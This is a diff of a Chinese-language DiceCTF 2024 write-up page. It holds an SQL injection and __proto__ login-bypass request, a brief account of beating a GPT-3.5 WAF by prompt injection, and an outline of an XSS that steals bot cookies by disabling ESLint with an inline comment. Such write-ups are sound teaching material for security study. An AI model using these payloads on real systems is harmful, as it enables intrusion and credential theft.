@@ -582,6 +582,13 @@
     </span>
 </a>
 </li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#webcalculator-2">
+<span class="md-ellipsis">
+      web/calculator-2
+    </span>
+</a>
+</li>
 </ul>
 </nav>
 </li>
@@ -703,6 +710,13 @@
     </span>
 </a>
 </li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#webcalculator-2">
+<span class="md-ellipsis">
+      web/calculator-2
+    </span>
+</a>
+</li>
 </ul>
 </nav>
 </div>
@@ -773,9 +787,9 @@
 <span class="w">    </span><span class="p">],</span>
 <span class="p">]</span>
 </code></pre></div>
-<p><code>encode</code> 函数可以直接在控制台调用：</p>
-<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="../assets/images/writeups/dicectf2024_quals/dicedicegoose_console.png"><img alt="dicedicegoose_console" src="../assets/images/writeups/dicectf2024_quals/dicedicegoose_console.png"/></a></p>
-<p>Flag ：<code>dice{pr0_duck_gam3r_AAEJCQEBCQgCAQkHAwEJBgQBCQUFAQkEBgEJAwcBCQIIAQkB}</code></p>
+<p><code>encode</code> 函数可以直接在控制台调用：
+<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="../assets/images/writeups/dicectf2024_quals/dicedicegoose_console.png"><img alt="dicedicegoose_console" src="../assets/images/writeups/dicectf2024_quals/dicedicegoose_console.png"/></a></p>
+<p>Flag: <code>dice{pr0_duck_gam3r_AAEJCQEBCQgCAQkHAwEJBgQBCQUFAQkEBgEJAwcBCQIIAQkB}</code></p>
 <h2 id="webfunnylogin">web/funnylogin<a class="headerlink" href="#webfunnylogin" title="Permanent link">¶</a></h2>
 <p>“原来有附件啊<heti-adjacent class="heti-adjacent-quarter">？</heti-adjacent>”.jpg</p>
 <div class="highlight"><table class="highlighttable"><tr><th class="filename" colspan="2"><span class="filename">app.js</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
@@ -895,13 +909,13 @@
 <span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`web/funnylogin listening on port </span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">));</span>
 </code></pre></div></td></tr></table></div>
 <p><span>SQL<span class="heti-spacing"> </span></span>注入是没跑了，<code>pass=' OR id = 1 AND 'a' = 'a</code> 可以登录 <code>id</code> 为<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>的用户，但管理员用户不确定是哪一个，且管理员在程序中设定，不在数据库里。</p>
-<p>接下来是第二个漏洞，<code>isAdmin[user]</code> 有缺陷（应该用 <code>isAdmin[id]</code><heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，它不一定非要是 <code>true</code> ，只要任何不是 <code>false</code>、<code>0</code>、<code>""</code>、<code>null</code>、<code>undefined</code>、<code>Nan</code> 这些 “falsy” 的值，都可以条件判断成功。</p>
+<p>接下来是第二个漏洞，<code>isAdmin[user]</code> 有缺陷，它不一定非要是 <code>true</code> ，只要任何不是 <code>false</code>、<code>0</code>、<code>""</code>、<code>null</code>、<code>undefined</code>、<code>Nan</code> 这些 “falsy” 的值，都可以条件判断成功。</p>
 <p>设置 <code>user</code> 为 <code>__proto__</code>、<code>__defineGetter__</code>、<code>constructor</code> 等都可以通过。</p>
 <div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
 
 user=__proto__&amp;pass=' OR id = 1 AND 'a' = 'a
 </code></pre></div>
-<p>Flag ：<code>dice{i_l0ve_java5cript!}</code></p>
+<p>Flag: <code>dice{i_l0ve_java5cript!}</code></p>
 <h2 id="webgpwaf">web/gpwaf<a class="headerlink" href="#webgpwaf" title="Permanent link">¶</a></h2>
 <p>有意思，<span>Prompt Injection<span class="heti-spacing"> </span></span>的题目。</p>
 <p>程序用预设的一段<span class="heti-skip"><span class="heti-spacing"> </span>Prompt<span class="heti-spacing"> </span></span>将<span class="heti-skip"><span class="heti-spacing"> </span>GPT3.5<span class="heti-spacing"> </span></span>设置为<span><span class="heti-spacing"> </span>WAF</span> ，检测输入内容是否存在黑客行为，返回 <code>H</code> 或者 <code>R</code> 。</p>
@@ -923,13 +937,326 @@ H means hacking attempt, R means not a hacking attempt.
 <p>Flag ：<code>dice{wtf_gpt_i_thought_you_were_a_smart_waf}</code></p>
 <p>准备在校内赛也出一个<span class="heti-skip"><span class="heti-spacing"> </span>Prompt Injection<span class="heti-spacing"> </span></span>的题目，人数少，<span>API<span class="heti-spacing"> </span></span>调用应该没那么多限制了。</p>
 <h2 id="webcalculator">web/calculator<a class="headerlink" href="#webcalculator" title="Permanent link">¶</a></h2>
-<p>输入单个<span class="heti-skip"><span class="heti-spacing"> </span>TypeScript<span class="heti-spacing"> </span></span>表达式，类型为 <code>number</code> 并且</p>
+<p>输入单个<span class="heti-skip"><span class="heti-spacing"> </span>TypeScript<span class="heti-spacing"> </span></span>表达式，求值后将结果直接显示到页面上。</p>
+<p>错误信息会被处理，所以只有执行成功时才能<span><span class="heti-spacing"> </span>XSS</span>。</p>
+<div class="highlight"><table class="highlighttable"><tr><th class="filename" colspan="2"><span class="filename">index.ts</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">runQuery</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">query</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nb">Promise</span><span class="o">&lt;</span><span class="kt">string</span><span class="o">&gt;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">75</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s1">'equation is too long'</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">run</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="p">,</span><span class="w"> </span><span class="s1">'number'</span><span class="p">)</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">errors</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">errors</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">'\n'</span><span class="p">))</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="kt">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">value</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="sb">`result: </span><span class="si">${</span><span class="nx">value</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s1">'unknown error'</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="o">:</span><span class="w"> </span><span class="kt">Request</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="o">:</span><span class="w"> </span><span class="kt">Response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">''</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">runQuery</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">''</span>
+
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="sb">`</span>
+<span class="sb">        &lt;html&gt;</span>
+<span class="sb">            &lt;body&gt;</span>
+<span class="sb">                &lt;div&gt;</span>
+<span class="sb">                    &lt;h1&gt;Calculator&lt;/h1&gt;</span>
+<span class="sb">                    &lt;form action="/" method="GET"&gt;</span>
+<span class="sb">                        &lt;input type="text" name="q" value="</span><span class="si">${</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="si">}</span><span class="sb">"&gt;</span>
+<span class="sb">                        &lt;input type="submit"&gt;</span>
+<span class="sb">                    &lt;/form&gt;</span>
+<span class="sb">                    &lt;p&gt;</span><span class="si">${</span><span class="nx">message</span><span class="si">}</span><span class="sb">&lt;/p&gt;</span>
+</code></pre></div></td></tr></table></div>
+<p><code>run</code> 函数在 <code>jail/index.ts</code>，输入的语句先被 <code>sanitize(number, code)</code> 处理后才执行。</p>
+<div class="highlight"><table class="highlighttable"><tr><th class="filename" colspan="2"><span class="filename">jail/index.ts</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">export</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="o">&lt;</span><span class="nx">T</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="nx">keyof</span><span class="w"> </span><span class="nx">RunTypes</span><span class="o">&gt;</span><span class="p">(</span>
+<span class="w">    </span><span class="nx">code</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">timeout</span><span class="o">:</span><span class="w"> </span><span class="kt">number</span><span class="p">,</span>
+<span class="w">    </span><span class="kr">type</span><span class="o">:</span><span class="w"> </span><span class="nx">T</span><span class="p">,</span>
+<span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">RunResult</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">sanitize</span><span class="p">(</span><span class="kr">type</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">success</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">queue</span><span class="p">.</span><span class="nx">queue</span><span class="o">&lt;</span><span class="nx">RunResult</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">isolate</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">isolate</span><span class="p">.</span><span class="nx">createContext</span><span class="p">()</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">race</span><span class="p">([</span>
+<span class="w">            </span><span class="nx">context</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">output</span><span class="p">).</span><span class="nx">then</span><span class="p">((</span><span class="nx">output</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nx">RunResult</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span>
+<span class="w">                </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span>
+<span class="w">                </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="kt">output</span><span class="p">,</span>
+<span class="w">            </span><span class="p">})),</span>
+<span class="w">            </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">RunResult</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="nx">context</span><span class="p">.</span><span class="nx">release</span><span class="p">()</span>
+<span class="w">                    </span><span class="nx">resolve</span><span class="p">({</span>
+<span class="w">                        </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span>
+<span class="w">                        </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">'evaluation timed out!'</span><span class="p">],</span>
+<span class="w">                    </span><span class="p">})</span>
+<span class="w">                </span><span class="p">},</span><span class="w"> </span><span class="nx">timeout</span><span class="p">)</span>
+<span class="w">            </span><span class="p">})</span>
+<span class="w">        </span><span class="p">])</span>
+<span class="w">    </span><span class="p">})</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><code>sanitize</code> 在 <code>jail/sanitize.ts</code>，它使用 <code>parse</code> 函数检查用户输入是否只有一个单独的表达式语句，然后拼接到 <code>data</code> 中，使用 <code>ESLint</code> 进行代码检查（具体在 <code>VirtualProject</code> 中<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>。</p>
+<div class="highlight"><table class="highlighttable"><tr><th class="filename" colspan="2"><span class="filename">jail/sanitize.ts</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">parse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">text</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nx">Result</span><span class="o">&lt;</span><span class="kt">string</span><span class="o">&gt;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ts</span><span class="p">.</span><span class="nx">createSourceFile</span><span class="p">(</span><span class="s1">'file.ts'</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">,</span><span class="w"> </span><span class="nx">ScriptTarget</span><span class="p">.</span><span class="nx">Latest</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">statements</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">'expected a single statement'</span><span class="p">],</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">statement</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">file</span><span class="p">.</span><span class="nx">statements</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">ts</span><span class="p">.</span><span class="nx">isExpressionStatement</span><span class="p">(</span><span class="nx">statement</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">'expected an expression statement'</span><span class="p">],</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">output</span><span class="o">:</span><span class="w"> </span><span class="kt">ts</span>
+<span class="w">            </span><span class="p">.</span><span class="nx">createPrinter</span><span class="p">()</span>
+<span class="w">            </span><span class="p">.</span><span class="nx">printNode</span><span class="p">(</span><span class="nx">EmitHint</span><span class="p">.</span><span class="nx">Expression</span><span class="p">,</span><span class="w"> </span><span class="nx">statement</span><span class="p">.</span><span class="nx">expression</span><span class="p">,</span><span class="w"> </span><span class="nx">file</span><span class="p">),</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">export</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">sanitize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="kr">type</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">input</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span>
+<span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">Result</span><span class="o">&lt;</span><span class="kt">string</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sr">/[^ -~]|;/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">input</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">'only one expression is allowed'</span><span class="p">],</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parse</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">expression</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">expression</span>
+
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`((): </span><span class="si">${</span><span class="kr">type</span><span class="si">}</span><span class="sb"> =&gt; (</span><span class="si">${</span><span class="nx">expression</span><span class="p">.</span><span class="nx">output</span><span class="si">}</span><span class="sb">))()`</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">project</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">VirtualProject</span><span class="p">(</span><span class="s1">'file.ts'</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">errors</span><span class="p">,</span><span class="w"> </span><span class="nx">messages</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">project</span><span class="p">.</span><span class="nx">lint</span><span class="p">()</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">errors</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span><span class="w"> </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="kt">messages</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">project</span><span class="p">.</span><span class="nx">compile</span><span class="p">()</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p>如果传入语句是 <code>1+1</code>，<code>data</code> 就是：</p>
+<div class="highlight"><pre><span></span><code><span class="p">(()</span><span class="o">:</span><span class="w"> </span><span class="kt">number</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">+</span><span class="mf">1</span><span class="p">))()</span>
+</code></pre></div>
+<p>这意味着语句的值必须是 <code>number</code> 类型的，不然无法通过<span class="heti-skip"><span class="heti-spacing"> </span>ESLint<span class="heti-spacing"> </span></span>检查。</p>
+<p>所以，解题思路就是：绕过语句值必须为 <code>number</code> 类型的<span class="heti-skip"><span class="heti-spacing"> </span>ESLint<span class="heti-spacing"> </span></span>检查，返回字符串，<span>XSS<span class="heti-spacing"> </span></span>获得<span class="heti-skip"><span class="heti-spacing"> </span>Bot Cookies<span class="heti-spacing"> </span></span>中的<span><span class="heti-spacing"> </span>Flag</span>。</p>
+<p>稍微卑鄙一点的手段：<code>diff</code> 下一题的源码，看看修改了哪部分。</p>
+<div class="highlight"><pre><span></span><code><span class="gh">diff '--color=auto' calculator-1/jail/sanitize.ts calculator-2/jail/sanitize.ts</span>
+<span class="gu">1c1</span>
+<span class="gd">&lt; import ts, { EmitHint, ScriptTarget } from 'typescript'</span>
+<span class="gs">---</span>
+<span class="gi">&gt; import ts, { EmitHint, Node, ScriptTarget } from 'typescript'</span>
+22a23,46
+<span class="gi">&gt;         }</span>
+<span class="gi">&gt;     }</span>
+&gt;
+<span class="gi">&gt;     const comments = (ts.getLeadingCommentRanges(text, 0) ?? [])</span>
+<span class="gi">&gt;         .concat(ts.getTrailingCommentRanges(text, 0) ?? [])</span>
+&gt;
+<span class="gi">&gt;     if (</span>
+<span class="gi">&gt;         comments.length &gt; 0</span>
+<span class="gi">&gt;         || [</span>
+<span class="gi">&gt;             '/*',</span>
+<span class="gi">&gt;             '//',</span>
+<span class="gi">&gt;             '#!',</span>
+<span class="gi">&gt;             '&lt;!--',</span>
+<span class="gi">&gt;             '--&gt;',</span>
+<span class="gi">&gt;             'is',</span>
+<span class="gi">&gt;             'as',</span>
+<span class="gi">&gt;             'any',</span>
+<span class="gi">&gt;             'unknown',</span>
+<span class="gi">&gt;             'never',</span>
+<span class="gi">&gt;         ].some((c) =&gt; text.includes(c))</span>
+<span class="gi">&gt;     ) {</span>
+<span class="gi">&gt;         return {</span>
+<span class="gi">&gt;             success: false,</span>
+<span class="gi">&gt;             errors: ['illegal syntax'],</span>
+</code></pre></div>
+<p>发现增加了很多注释符号，通过搜索 <code>comment flag ESLint disable</code> 找到了<a href="https://eslint.org/docs/latest/use/command-line-interface#inline-configuration-comments">官方文档</a>中通过注释修改配置的方式：</p>
+<ul>
+<li><code>/*eslint-disable*/</code></li>
+<li><code>/*eslint-enable*/</code></li>
+<li><code>/*global*/</code></li>
+<li><code>/*eslint*/</code></li>
+<li><code>/*eslint-env*/</code></li>
+<li><code>// eslint-disable-line</code></li>
+<li><code>// eslint-disable-next-line</code></li>
+</ul>
+<p>使用 <code>/*eslint-disable*/</code> 关闭<span><span class="heti-spacing"> </span>ESLint</span>，再配合 <code>as any</code>，就可以顺利返回一个字符串了。</p>
